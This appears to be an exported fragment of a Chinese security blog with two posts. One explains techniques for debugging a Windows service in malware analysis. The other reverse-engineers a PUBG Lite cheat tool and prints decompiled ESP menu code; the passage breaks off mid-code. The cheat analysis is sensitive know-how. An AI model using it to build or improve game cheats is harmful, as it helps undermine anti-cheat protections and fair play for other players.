href=\"https://bbs.pediy.com/thread-229643.htm\">[原创]使用Windbg&amp;OllyDbg从头调试windows服务-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>\n<p>但是跟着操作弄了一遍，虽然是弄好了，但是会出现一个情况就是调试器会非常的卡，而且过了一会就消失了，整个虚拟机就直接是卡死状态，研究了许久还是解决不了就放弃了。然后就自己办法弄，考虑过写驱动给拦截了，但是VS2022没有WDK，于是想到全局API Hook，然后发现svchost.exe不过消息队列。在觉得无望的时候，我在火绒剑发现了这么一个玩意。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>因为自己是没去研究过服务启动的一个流程，在分析样本的时候用的是sc命令启动，就以为服务是从sc.exe去加载的，然后去分析了半天，发现不行。于是乎发现了这么一个流程，服务的一个启动过程如下：</p>\n<p>service.exe —–[CreateProcessW]——-&gt;svchost.exe——-[LoadLibrary]——–&gt;服务启动</p>\n<p>然后就有了一个想法，直接附加service.exe然后给CreateProcessW下断点，再启动服务，拦截到svchost.exe的创建后，把参数修改为PROCESS_SUSPEND_RESUME，最后再用调试器附加svchost.exe下断LoadLibrary,手动恢复线程后等待目标服务DLL加载。理论存在开始实践。</p>\n<h2 id=\"法一：\"><a href=\"#法一：\" class=\"headerlink\" title=\"法一：\"></a>法一：</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>启动服务后直接断下，然后直接查看参数，发现是包含了线程暂停。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>猜到后面会存在恢复线程操作，就稍微跟了一下。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>F8走几步发现了恢复线程的函数，这里直接Nop掉不让他执行。走完之后直接恢复这个地方的Call</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>这个时候已经可以把调试器F9跑起来了，然后会突然断在异常上。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>这里的这个异常让我想到了另一种调试方法，在法二里。</p>\n<p>这个时候另一个调试器附加创建出来的进程。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>恢复线程，然后F9让调试器跑起来。这个时候这里是不会断下的，需要到第一个调试器F9，一直F9到第二个调试器断下。（<strong>这里猜测是因为services.exe的操作没跑完，然后svchost.exe单独跑就出现问题。）</strong></p>\n<p>第二个调试器断下后，就可以直接单次F9等到目标DLL加载了。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>加载完毕，直接跳到目标DLL的函数下断即可。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>接下来配合IDA食用即可。</p>\n<h2 id=\"法二：\"><a href=\"#法二：\" class=\"headerlink\" title=\"法二：\"></a>法二：</h2><p>这个方法是我在调试的时候发现的一个特征，不知道适不适用，就是直接暴力断网，因为恶意样本以服务形式启动，肯定不是为了好玩，其中肯定会有网络行为。那么断网会导致样本在通讯的时候会产生一个等待行为，那么这个等待行为就可以拿来用。举个例子，样本存在下面的代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = URLDownloadToFileW()</span><br><span class=\"line\"><span class=\"keyword\">if</span>(a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么，在服务调用URLDownloadToFileW这个函数时，由于你网络断开，那么他就会有一个网络等待行为，通常这个等待行为不会很长也不会很久，在这个等待时间里，直接用火绒剑查看服务所存在的进程PID，然后调试器附加后到if(a)这个位置下断，然后把网连上即可，函数返回断下后就可以开始分析了。</p>\n<h2 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h2><p>1）、服务加载的超时时间，因为调试原因，服务加载的时候超过了规定时间，就会直接结束调试，所以需要设置时间。设置方法，这里直接截图开头那位大哥帖子里的内容。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>2）、调试需要提前开启好两个，因为一但调试进行，电脑就会卡死，无法打开东西。（貌似可以通过cmd命令打开）</p>\n<p>3）、关闭系统异常时自动关机的选项，不然会突然直接提示一分钟后自动关机。（计算机右键-属性-高级系统设置）</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>虽然我这两个方法确实有点乱七八槽，但确实是可以调试服务的。如果各位大哥还有啥好法子，也可以支支招。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n","categories":["Virus"]},{"title":"某Pubg Lite辅助逆向分析过程及心得","url":"/2024/04/21/%E6%9F%90Pubg%20Lite%E8%BE%85%E5%8A%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%BF%83%E5%BE%97/","content":"<ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2020-1-25 21:36</li>\n</ul>\n<p>新的一年，先祝看雪各位成员新年快乐！另外也要多注意身体和卫生，今年与往年大大不同，这次瘟疫大爆发且气象异常搞得人心不安，不要在这样一个欢喜的节日里把自己交代了。在次也希望武汉能挺过这次大劫，武汉加油！</p>\n<h1 id=\"正文：\"><a href=\"#正文：\" class=\"headerlink\" title=\"正文：\"></a>正文：</h1><p>昨天得到一款PubgLite辅助，然后看到一些好玩的功能就尝试着去分析一下，看看能不能为我所用。分析的第一步，当然是先运行查看效果。由于该辅助会被游戏检测，所以只放一张菜单图。</p>\n<p><img src=\"/../images/GameHacker/%E6%9F%90Pubg%20Lite%E8%BE%85%E5%8A%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%BF%83%E5%BE%97/Untitled.png\" alt=\"Untitled\"></p>\n<p>从左上方的菜单我们可以看到有很多功能，首先透视功能基本就是通用公式算出来的，本文主要注重分析其他功能的一个实现。<strong>Tip:该游戏位64位游戏，在启动辅助的时候，会加载一个用于读写的驱动，但是火绒报毒说该驱动存在后门，至于真实性不做考察，大家如果想下载来运行一定要注意。</strong></p>\n<p>首先PE工具查壳，显示为无壳且32位程序**(本次只采用ida原地手撕，至于为什么不用动态调试有两点：1、该辅助实在太lj，开了直接检测，然后秒封号，根本没法调试。2、有后门)。**</p>\n<p>![Untitled%201](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 1.png)</p>\n<p>知道大概信息后，我们直接打开32位的ida，扔进去加载。</p>\n<p>![Untitled%202](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 2.png)</p>\n<p>老规矩，直接搜索字符串，因为该程序没有加壳，所以搜索到的东西都是明文。</p>\n<p>![Untitled%203](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 3.png)</p>\n<p>此时我们可以看到字符串中有VMP保护壳的相关字符串，既然前面查壳的时候是无壳，那么这个保护壳，我估计是给驱动文件加的，并不影响我们的分析。我们看看其他内容。</p>\n<p>![Untitled%204](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 4.png)</p>\n<p>![Untitled%205](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 5.png)</p>\n<p>可以看到一些辅助相关的内容。第一张图片可以看看到游戏进程名和类名，还有一些类似特征码和地址、偏移的东西；第二张图就可以看到辅助菜单的内容。那么我们如何通过这些字符串去分析呢？在这里，我给大家普及一下目前市场上辅助大致的绘制流程。</p>\n<p>![Untitled%206](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 6.png)</p>\n<p>Emmm,有点丑。。。。这张流程图中间的三个模块是在一个死循环里面的。</p>\n<p><strong>1）、第一个模块是用来获取游戏数据的，用来对后面功能作为一个初始化。</strong></p>\n<p><strong>2）、第二个模块该项功能是整个辅助的核心部分，里面存在多种算法和数据处理，比如透视常用的矩阵算法或者三角函数算法、自瞄用的角度算法、雷达透视用的朝向算法等等，但是这些算法大多都是已经另外封装，这里面只是对其调用。</strong></p>\n<p><strong>3）、第三个模块辅助菜单功能模块，就是用来显示和开关用的，里面通常会通过读取控制某个功能开关的变量来判断是否要打开功能。</strong></p>\n<p>上面三个模块执行完后就开始一个新的循环。</p>\n<p>以上就是目前市场上辅助的大致绘制流程。我们简单了解之后，思考一下怎么去分析，怎么去下手。在上面字符串中我们已经搜索到了菜单的字符串，那么我们就可以直接通过这个字符串来作为突破口。</p>\n<p>![Untitled%207](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 7.png)</p>\n<p>我们通过ida的交叉引用和F5功能来到了这里，我们大概看了一下，这里面都是菜单内容，而且最让人注意的是它每个功能都会有一个变量来判断开和关(和我上面所说的流程一致)。</p>\n<p>![Untitled%208](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 8.png)</p>\n<p>![Untitled%209](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 9.png)</p>\n<p>这里的标签是我在分析的是注释的，我们现在只需要注意这个地方。我们把这个段代码拉到顶部，也就是函数头的位置，按下<strong>X</strong>，看看什么地方有调用这个函数。</p>\n<p>![Untitled%2010](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 10.png)</p>\n<p>发现只有一个地方在调用，那么这个地方只可能在绘制流程内。<br>我们点击确定进行跳转。</p>\n<p>![Untitled%2011](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 11.png)</p>\n<p>我们可以看到我们来到了一坨函数的调用。那么这个地方，就和我说的流程一样了，只不过该辅助呢分的模块比较多。这里我已经分析完了，所以标签和注释什么的都写的一清二楚。接下来将带领大家来分析，看看如何得到这些东西。</p>\n<p>我们既然来到了这绘制流程，那么所有的核心代码肯定都在这个部分，我们可以一个一个函数去看，当然，这个只属于有从事这方面开发和有经验的人员，不然还是很难看出来的。那么就代表我们小白脸没法去分析了吗？当然是No。还记得上面菜单模块里面的那些个<strong>if</strong>吗？</p>\n<p>先贴出绘制菜单模块的代码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">DrawMenu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v1; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v4; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v7; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v8; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v9; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v10; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v11; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v13; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v14; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v15; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v16; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v17; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v18; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v19; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v20; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v21; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v22; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v23; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v24; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v25; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v26; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v27; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v28; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v29; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v30; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v31; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v32; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v33; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v34; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v35; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v36; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v37; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v38; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v39; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v40; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v41; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v42; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v43; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v44; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v45; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v46; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v47; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v48; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v49; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v50; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v51; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v52; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v53; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v54; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v55; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v56; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v57; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPVOID v58; <span class=\"comment\">// ST0C_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v59; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v60; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v61; <span class=\"comment\">// [esp+4h] [ebp-34h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v62; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v63; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v64; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v65; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v66; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v67; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v68; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v69; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v70; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v71; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  LPVOID v72[<span class=\"number\">2</span>]; <span class=\"comment\">// [esp+14h] [ebp-24h]</span></span><br><span class=\"line\">  <span class=\"type\">double</span> v73; <span class=\"comment\">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class=\"line\">  LPVOID lpMem[<span class=\"number\">2</span>]; <span class=\"comment\">// [esp+24h] [ebp-14h]</span></span><br><span class=\"line\">  LPVOID StrSwitch; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v76; <span class=\"comment\">// [esp+30h] [ebp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v77; <span class=\"comment\">// [esp+34h] [ebp-4h]</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  v77 = <span class=\"number\">10</span>;</span><br><span class=\"line\">  v76 = <span class=\"number\">20</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v0 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"string\">&quot;    T s&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(lpMem, <span class=\"number\">10</span>, <span class=\"number\">20</span>, v0);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( lpMem[<span class=\"number\">0</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(lpMem[<span class=\"number\">0</span>]);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Box )</span><br><span class=\"line\">    v1 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v1 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;显示方框F1&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v1);              <span class=\"comment\">// 这里是直接把文字显示</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Box )                             <span class=\"comment\">// 判断控制该功能的变量是否为真</span></span><br><span class=\"line\">    v2 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v2 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v2;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v62 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Box )</span><br><span class=\"line\">    v3 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v3 = (LPVOID)v62;</span><br><span class=\"line\">  v4 = v3;</span><br><span class=\"line\">  v5 = v76;</span><br><span class=\"line\">  v6 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v6, v5, v4);             <span class=\"comment\">// 把结果显示出去</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Hp )</span><br><span class=\"line\">    v7 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v7 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;显示血量F2&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v7);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Hp )</span><br><span class=\"line\">    v8 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v8 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v8;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v63 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Hp )</span><br><span class=\"line\">    v9 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v9 = (LPVOID)v63;</span><br><span class=\"line\">  v10 = v9;</span><br><span class=\"line\">  v11 = v76;</span><br><span class=\"line\">  v12 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v12, v11, v10);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Line )</span><br><span class=\"line\">    v13 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v13 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;显示射线F3&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v13);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Line )</span><br><span class=\"line\">    v14 = <span 